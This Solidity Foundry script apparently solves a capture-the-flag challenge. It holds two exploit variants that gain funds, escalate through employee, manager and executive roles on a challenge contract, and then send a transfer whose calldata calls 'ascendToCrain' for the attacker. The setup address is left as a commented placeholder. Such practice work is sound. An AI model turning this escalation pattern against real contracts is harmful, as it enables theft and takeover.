// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import {Script} from "forge-std/Script.sol";
import {Setup} from "src/contracts/Setup.sol";

contract ExploitExecutive1 is Script {
    Setup public setup;

    function run()public{
        vm.startBroadcast();
        setup=Setup(//YOUR__SETUP__ADDRESS);
        for(uint i=0;i<6;i++){
            setup.cexe().claimStartingBonus();
        }
        setup.cexe().becomeEmployee();
        setup.cexe().becomeManager();
        setup.cexe().becomeExecutive();
        bytes memory data = abi.encodeWithSignature("ascendToCrain(address)",address(this));
        setup.cexe().transfer(address(setup.crain()),0,data);
        vm.stopBroadcast();
    }

}

contract ExploitExecutive2 is Script {
    Setup public setup;

    function run() public {
        vm.startBroadcast();
        setup = Setup(//YOUR__SETUP__ADDRESS);
        setup.cexe().becomeEmployee();
        setup.cexe().buyCredit{value: 6 ether}();
        setup.cexe().becomeManager();
        setup.cexe().becomeExecutive();
        bytes memory data = abi.encodeWithSignature("ascendToCrain(address)", address(this));
        setup.cexe().transfer(address(setup.crain()), 0, data);
        vm.stopBroadcast();
    }
}
